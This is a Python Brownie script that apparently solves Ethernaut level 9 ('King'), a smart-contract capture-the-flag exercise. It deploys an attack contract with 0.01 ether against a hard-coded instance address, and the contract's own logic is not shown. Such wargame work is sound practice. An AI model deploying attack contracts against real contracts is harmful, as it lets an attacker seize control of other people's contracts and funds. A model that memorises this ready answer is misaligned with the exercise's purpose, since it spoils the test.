from scripts.helpful_scripts import get_account
from brownie import web3, Attack09, convert, interface

ETHERNAUT_INSTANCE = "0x36A486BAe1988F4aCB1F9ab5e0606A7A9f635C4f"
PRIZE = web3.toWei(0.01, "ether")


def main():

    player = get_account()

    # ----- so:   call prize  ->  read the value  ->  set PRIZE = prize
    #
    # prize = interface.KingInterface(ETHERNAUT_INSTANCE)
    # PRIZE = prize
    # king = interface.KingInterface(ETHERNAUT_INSTANCE)
    # print(f'{king} is the KING forever!!!')

    attack_contract = Attack09.deploy(
        ETHERNAUT_INSTANCE, {"from": player, "value": PRIZE}
    )
    print(f"attack contract deployed at: {attack_contract}\n")
